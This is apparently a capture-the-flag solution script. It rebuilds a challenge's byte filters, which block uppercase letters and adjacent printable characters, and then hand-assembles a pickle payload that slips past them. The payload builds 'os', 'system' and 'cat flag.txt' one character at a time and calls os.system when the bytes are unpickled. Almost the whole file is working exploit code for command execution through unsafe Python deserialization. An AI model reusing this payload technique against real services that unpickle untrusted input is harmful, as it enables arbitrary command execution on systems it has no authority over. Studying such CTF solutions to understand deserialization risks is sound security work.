import os
import pickle
import pickletools
import io
from string import ascii_uppercase

# make sure we have flag in the current directory
os.chdir("./container")


# Check 1: Blacklist
blacklist = list(map(lambda x: x.encode(), list(ascii_uppercase)))
blacklist.remove(b"R")


def validate(p):
    for i in blacklist:
        if i in p:
            return False
    return True


# Check 2: No two ascii characters next to each other
def check_adjacent_ascii(byte_str):
    for i in range(21, len(byte_str) - 2):
        if byte_str[i] < 0x7F and byte_str[i] > 0x1F:
            if byte_str[i + 1] < 0x7F and byte_str[i + 1] > 0x1F:
                return False
    return True


# -------- Exploit --------
def string(string):
    return pickle.SHORT_BINUNICODE + int.to_bytes(len(string), 1, "little") + string


def stringstring(ss):
    p = b""
    for i, s in enumerate(ss):
        p += pickle.PROTO + b"\x04"
        p += pickle.BINGET + b"\x00"
        p += string(bytes([s]))
        if i == len(ss) - 1:
            p += string(b"")

    for s in ss:
        p += pickle.TUPLE2
        p += pickle.REDUCE

    return p


payload = b""
payload += pickle.GLOBAL + b"operator\nadd\n"
payload += pickle.MEMOIZE
payload += pickle.MEMOIZE  # 0
payload += pickle.POP

payload += stringstring(b"os")
payload += stringstring(b"system")

payload += pickle.STACK_GLOBAL

payload += stringstring(b"cat flag.txt")
payload += pickle.TUPLE1
payload += pickle.REDUCE
payload += pickle.PROTO + b"\x04"

payload += pickle.STOP

assert validate(payload)
assert check_adjacent_ascii(payload)

pickle.loads(payload)
print()
print(payload.hex())
